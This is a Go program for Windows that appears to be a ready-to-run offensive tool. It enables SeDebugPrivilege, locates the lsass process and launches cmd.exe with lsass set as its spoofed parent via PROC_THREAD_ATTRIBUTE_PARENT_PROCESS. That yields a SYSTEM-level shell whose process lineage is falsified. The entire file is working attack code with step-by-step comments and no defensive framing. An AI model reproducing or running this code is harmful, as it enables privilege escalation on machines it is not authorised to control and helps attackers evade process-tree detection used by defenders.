package main

import (
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"

	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
)

// This is out STARTUPINFOEX struct
type STARTUPINFOEX struct {
	StartupInfo   windows.StartupInfo
	AttributeList *LPPROC_THREAD_ATTRIBUTE_LIST
}

// This is our opaque LPPROC_THREAD_ATTRIBUTE_LIST struct
// This is used to allocate 48 bytes of memory easily (8*6 = 48)
type LPPROC_THREAD_ATTRIBUTE_LIST struct {
	_, _, _, _, _, _ uint64
}

// This is our PTOKEN_PRIVILEGES struct
type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]windows.LUIDAndAttributes
}


func SeDebugPriv() {
	var(
		dllAdvapi32 = windows.NewLazySystemDLL("advapi32.dll")
		// Load the functions from advapi32.dll that we need by name
		funcAdjustTokenPrivileges = dllAdvapi32.NewProc("AdjustTokenPrivileges")
		// Adjust our privileges to get the debug privilege "SeDebugPrivilege"
	)

	// Get UTF16 string pointer
	debugNamePtr, err := windows.UTF16PtrFromString("SeDebugPrivilege")

	if err != nil {
		panic("cannot convert privilege string: " + err.Error())
	}

	// Declare a TOKEN_PRIVILEGES struct to store the resulting Privileges into.
	var newPrivileges TOKEN_PRIVILEGES

	// Convert the Privilege name to it's SID value and store it into our TOKEN_PRIVILEGES struct.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
	//
	err = windows.LookupPrivilegeValue(
		nil,                               // "SystemName", can be nil
		debugNamePtr,                      // UTF16 string pointer to the name of the requested privilege
		&newPrivileges.Privileges[0].Luid, // Pointer to the LUID storage for the resulting privilege SID
	)

	if err != nil {
		panic("LookupPrivilegeValue failed: " + err.Error())
	}

	// Set the privilege attributes to be enabled (apply this privilege)
	newPrivileges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	// Set the count of Privileges requested
	newPrivileges.PrivilegeCount = 1

	// Declare a variable to store a HANDLE to out current TOKEN.
	var ourToken windows.Token

	// Open our current process TOKEN to change it's permissions.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
	//
	err = windows.OpenProcessToken(
		windows.Handle(^uintptr(1-1)),           // HANDLE to this current process
		windows.TOKEN_WRITE|windows.TOKEN_QUERY, // Requested access rights
		&ourToken, // Pointer to the TOKEN to receive the resulting TOKEN
	)

	if err != nil {
		panic("OpenProcessToken failed: " + err.Error())
	}

	// Apply the resulting privileges to our current process.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
	//
	_, _, err = funcAdjustTokenPrivileges.Call(
		uintptr(ourToken),                       // HANDLE of our current TOKEN
		0,                                       // Flag "DisableAllPrivileges" set to FALSE
		uintptr(unsafe.Pointer(&newPrivileges)), // Pointer to our new Privileges struct
		uintptr(unsafe.Sizeof(newPrivileges)),   // Size of our Privileges struct
		0,                                       // Pointer to the previous privleges, can be NULL
		0,                                       // Pointer to length of the previous privileges, can be NULL
	)

	if err.(syscall.Errno) != 0 {
		panic("AdjustTokenPrivileges failed: " + err.Error())
	}

	// Close Token
	ourToken.Close()
}

func getpid(pname []string) int {
	target_procs := pname
	processList, err := ps.Processes()
	if err != nil {
		fmt.Println("ps.Processes() Failed, are you using windows?")
		return 0
	}
	for _,proc := range target_procs {
		for x := range processList {
			var process ps.Process
			process = processList[x]
			if strings.Contains(process.Executable(), proc) {
				return process.Pid()
			} else {
				// sleep to limit cpu usage
				time.Sleep(5 * time.Millisecond)
			}

		}
	}
	return 0
}


func main() {
	// Security attributes that are needed to spoof parent processes
	const requestRights = windows.PROCESS_TERMINATE | windows.SYNCHRONIZE | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_CREATE_PROCESS | windows.PROCESS_SUSPEND_RESUME | windows.PROCESS_DUP_HANDLE

	var (
		// Command we are going to run.
		// Taken from command line.
		command = "C:\\Windows\\System32\\cmd.exe" // "cmd.exe /c echo Hello-There & ping 127.0.0.1"

		// Victim process ID
		// Taken from command line.
		targetPID = getpid([]string{"lsass"})

		// Link and load kernel32.dll
		// kernel32.dll contains the functions we need.
		dllKernel32 = windows.NewLazySystemDLL("kernel32.dll")

		// Load the functions from kernel32.dll that we need by name.
		funcCreateProcess                     = dllKernel32.NewProc("CreateProcessW")
		funcUpdateProcThreadAttribute         = dllKernel32.NewProc("UpdateProcThreadAttribute")
		funcInitializeProcThreadAttributeList = dllKernel32.NewProc("InitializeProcThreadAttributeList")


	)
	if targetPID == 0{
		fmt.Println("未找到\"spoolsv\",\"lsass\"进程")
		return
	}

	SeDebugPriv()

	// Get HANDLE to the target process
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	//
	targetHandle, err := windows.OpenProcess(
		requestRights,     // Security Access rights
		true,              // Inherit Handles
		uint32(targetPID), // Target Process ID
	)

	if err != nil {
		panic("OpenProcess failed: " + err.Error())
	}

	// Declare some variables to create the StartupInfoEx struct
	var (
		size                uint64
		startupInfoExtended STARTUPINFOEX
	)

	// This function ALWAYS returns an error. The only way to detect a failure is to determine
	// if the size is lower than the smallest allocation size (48 bytes).
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
	//
	funcInitializeProcThreadAttributeList.Call(
		0,                              // Initial should be NULL
		1,                              // Amount of attributes requested
		0,                              // Reserved, must be zero
		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory to reserve
	)

	if size < 48 {
		panic("InitializeProcThreadAttributeList returned invalid size!")
	}

	// Allocate the memory space for the opaque struct
	startupInfoExtended.AttributeList = new(LPPROC_THREAD_ATTRIBUTE_LIST)

	// Actually allocate the memory required for the LPPROC_THREAD_ATTRIBUTE_LIST blob.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
	//
	initResult, _, err := funcInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
		1,                              // Amount of attributes requested
		0,                              // Reserved, must be zero
		uintptr(unsafe.Pointer(&size)), // Pointer to UINT64 to store the size of memory that was written
	)

	if initResult == 0 {
		panic("InitializeProcThreadAttributeList failed: " + err.Error())
	}

	// Update the LPPROC_THREAD_ATTRIBUTE_LIST blob with the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
	//
	updateResult, _, err := funcUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(startupInfoExtended.AttributeList)), // Pointer to the LPPROC_THREAD_ATTRIBUTE_LIST blob
		0,                                      // Reserved, must be zero
		0x00020000,                             // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS constant
		uintptr(unsafe.Pointer(&targetHandle)), // Pointer to HANDLE of the target process
		uintptr(unsafe.Sizeof(targetHandle)),   // Size of the HANDLE
		0,                                      // Pointer to previous value, we can ignore it
		0,                                      // Pointer the size to previous value, we can ignore it
	)

	if updateResult == 0 {
		panic("UpdateProcThreadAttribute failed: " + err.Error())
	}

	// Set STARTUPINFO size to match the extended size
	startupInfoExtended.StartupInfo.Cb = uint32(unsafe.Sizeof(startupInfoExtended))

	// Convert string to UTF16 Pointer
	commandPtr, err := windows.UTF16PtrFromString(command)

	if err != nil {
		panic("cannot convert command: " + err.Error())
	}

	// Declare a variable to store our resulting process info
	var procInfo windows.ProcessInformation

	// Create and start the process with out new STARTUPINFOEX struct.
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
	//
	// The CREATE_NEW_CONSOLE flag is REQUIRED when attempting to spoof a parent process as the parent may not have
	// an allocated coonsole for useage, which would cause the process to crash if it requires one.
	execResult, _, err := funcCreateProcess.Call(
		0,                                   // Application name pointer, can be NULL
		uintptr(unsafe.Pointer(commandPtr)), // Command line pointer
		0,                                   // Process SECURITY_ATTRIBUTES, can be NULL
		0,                                   // Thread SECURITY_ATTRIBUTES, can be NULL
		uintptr(1),                          // Inherit Handles, set to true
		uintptr(0x00080000|windows.CREATE_NEW_CONSOLE), // Process creation flags, the EXTENDED_STARTUPINFO_PRESENT (0x00080000) flag is required
		0, // Environment Block, can be NULL
		0, // Current working directory, can be NULL
		uintptr(unsafe.Pointer(&startupInfoExtended)), // Pointer to our STARTUPINFOEX struct
		uintptr(unsafe.Pointer(&procInfo)),            // Pointer to our PROCESS_INFORMATION struct
	)

	if execResult == 0 {
		panic("CreateProcess failed: " + err.Error())
	}

	// Print out new process info!
	fmt.Printf("Process Created!\nPID: %d\n", procInfo.ProcessId)

	// Wait for process to complete
	//
	// MSDoc https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
	//
	/*
	waitResult, err := windows.WaitForSingleObject(
		procInfo.Process, // HANDLE to created process
		windows.INFINITE, // Timeout value (currently infinite)
	)

	if waitResult != windows.WAIT_OBJECT_0 {
		panic("WaitForSingleObject failed: " + err.Error())
	}

	 */

	// Release Resources
	windows.CloseHandle(targetHandle)

	fmt.Println("Process complete!")
}